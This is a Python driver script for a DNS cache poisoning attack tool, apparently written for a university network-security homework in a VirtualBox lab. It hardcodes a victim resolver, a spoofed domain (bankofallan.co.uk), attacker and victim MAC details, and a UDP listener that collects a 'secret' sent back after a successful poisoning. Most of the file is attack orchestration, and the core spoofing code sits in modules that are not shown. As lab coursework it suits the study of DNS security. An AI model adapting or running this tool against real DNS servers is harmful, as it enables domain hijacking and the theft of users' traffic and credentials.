#! /usr/bin/env python3
    
## @package Main
#   This package is responsible to execute all the passages required for the attack related to our ETH homework.
#


import dns.resolver
from dns.resolver import NoAnswer

import multiprocessing
import socket
import sys
import signal

from blessings import Terminal #For terminal threading

from multiprocessing.pool import ThreadPool, Pool
#import threading
from threading import Thread

from dns_poisoning import DNSPoisoning
from dns_attack import DNSAttack
import argparse


#Globals
secret_fetch_flag = True        #Used to stop the secret fetcher
custom_verbosity = 5
term = Terminal()
attack_pool = None
secret_socket = None
stop = False

log_file = "log_secret.txt"

## Logging function
#
#   @brief The fuction used for output messages
#   @param msg The message to display
#   Verbosity can be set in order to suppres the output
#
def log(msg, verbosity=1):
    if verbosity > custom_verbosity:
        print(msg.format(t=term))
        

def sigint_handler(sig, frame):
    import time

    global secret_fetch_flag
    log("Stopping secret fetcher thread...")
    secret_fetch_flag = False
    if secret_socket != None:
            secret_socket.close()
    time.sleep(1)
    #signal.signal(signal.SIGINT, sys.exit(0))
    log("Stopping all the attacks...")
    print("Exiting...")
    sys.exit(0)

##
#       @brief Routine that fetch the secret
#
#       Start a small UDP server which listen on the provided port for the secrets.\n
#       It also write the secrets into the log_file file.
#
def secret_fetcher(server_ip, server_port):
    global stop

    try:
        secret_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
        secret_socket.bind((server_ip, server_port))
    except:
        print("{t.bold}{t.red}Unable to bind for secret service{t.normal}!!!!".format(t=term))
        print("Attack may be successful but no secret will be received...")

    file_secret = None
    try:
        file_secret = open(log_file, "a+")
    except:
        print("{t.bold}{t.red}Unable to open log file{t.normal}!!!!".format(t=term))

    print("({t.bold}secret fetcher{t.normal}) Listening on {IP}:{port} for incoming message...".format(t=term, IP=server_ip, port=server_port))

    while secret_fetch_flag:
        try:
                data, addr = secret_socket.recvfrom(1024) # buffer size is 1024 bytes
                print("({t.bold}secret fetcher{t.normal})Received response:{msg}".format(msg=data, t=term))
                stop = True
                file_secret.write("Secret fetched: " + str(data))
        except:
                print("Error During secret fetching, exiting")
                return
                
##
#       @brief The routine that lauches the attack
#       @param victim_server_ip         The target server IP
#       @param domain                   The domain to spoof
#
def launch_attack(victim_server_ip, domain, bad_server_data, attacker_ip, number_of_tries=None, victim_mac=None):

        attack = DNSAttack(victim_server_ip, domain, bad_server_data,\
                 attacker_ip, victim_mac=victim_mac,\
                blessing_terminal=term, sigint_handler=sigint_handler, log_function=log)

        if number_of_tries == None:
                number_of_tries=50

        attack.start(number_of_tries, mode=DNSAttack.Mode.FAST) 

def validate_parameters(params):

        if not check_ip(params["attacker_ip"]):
                print("Invalid Attacker IP")
                return False
        if not check_ip(params["victim_dns_ip"]):
                print("Invalid Victim DNS IP")
                return False
        if not check_domain(params["target_domain"]):
                print("Invalid Target Domain")
                return False        


        return True

def fetch_parameter(*args):
        parser = argparse.ArgumentParser(description='DNS Poisoning Attack Tool')
        parser.add_argument('-t', '--target-domain', help='The target domain to spoof', required=True, type=str)
        parser.add_argument('-a', '--attacker-ip', help='Attacker IP address', required=True, type=str)
        parser.add_argument('-v', '--victim-dns-ip', help='The victim DNS IP address', required=True, type=str)

        parser.add_argument('-bs', '--bad-server-ip', help='The Bad Guy DNS server IP', required=False, type=str, default='192.168.56.1')
        parser.add_argument('-bp', '--bad-server-port', help='The Bad Guy DNS server port', required=False, type=int, default=55553)
        parser.add_argument('-ns', '--ns-server', help='The victim authoritative server', required=False, type=str)
        parser.add_argument('-i', '--interface', help='The Network Card interface to use', required=False, type=str)

        parser.add_argument('-at', '--attack-type', help='The type of attack to perform', choices=['NORMAL', 'DAN'], required=False, type=str)
        
        parser.add_argument('-m', '--mode', help='Mode to use', choices=['NORMAL','FAST'], required=False, type=str, default='NORMAL')
       
        parser.add_argument('-vm', '--victim-mac', dest='victimMac', help='The victim MAC address', required=False, type=str)

        args = parser.parse_args()

        if args.mode == "FAST" and args.victimMac is None:
                parser.error("FAST Mode require the victim MAC address")
                

        if validate_parameters(vars(args)):
                return vars(args)
        else:
                return False

##
#       @brief Check if the passed IP address is valid
#       @param The IP address to check
#       @return True if is valid, False otherwise
#
def check_ip(ip):
        import ipaddress
        
        try:
                ipaddress.ip_address(ip)
        except:
                return False
        else:
                return True

##
#       @brief Check if a domain is valid
#       Tries to resolve the domain in order to check if it is valid or not
#       
#       @param domain   The domain to check
#
#       @bug Cannot specify which nameserver should be used
def check_domain(domain):
        return True
        #try:
        #        socket.gethostbyname(domain.strip())
        #except socket.gaierror:
        #        print("Unable to get address for " + str(domain))
        #        return False
        #return True




def main(*args):

        print("\n{t.bold}DNS Cache Poisoning Tool{t.normal}\n".format(t=term))

        param = fetch_parameter(*args)

        if param is False:
                print("Parameter error, exiting...")
                return 

        victim_server_ip = param['victim_dns_ip']

        victim_server_ip = '192.168.56.3'
        attacker_ip = '192.168.56.1'
        domain = 'bankofallan.co.uk'
        #Bad Guy
        bad_udp_port = 55553
        bad_udp_ip = '192.168.56.1'

        secret_ip = '192.168.56.1'
        secret_port = 1337

        bad_server = (bad_udp_ip, bad_udp_port)

        victim_mac = "08:00:27:be:48:1d"
        nic_interface = 'vboxnet0'


        #Launch the secret fetcher
        secret_thread = Thread(target=secret_fetcher, args = (secret_ip, secret_port),daemon=True)
        secret_thread.start()

        try:

                launch_attack(victim_server_ip, domain, bad_server, attacker_ip ,number_of_tries=30, victim_mac=victim_mac)

        except DNSAttack.CriticalError:
                print("\n{t.red}{t.bold}Critical Error occurred{t.normal}!!!\nTerminating".format(t=term))
        except DNSAttack.SuccessfulAttack:
                print("\n\n{t.green}{t.bold}Attack Successully executed{t.normal}".format(t=term))
        finally:
                print("Exiting...")




if __name__ == '__main__':
        main(*sys.argv[1:])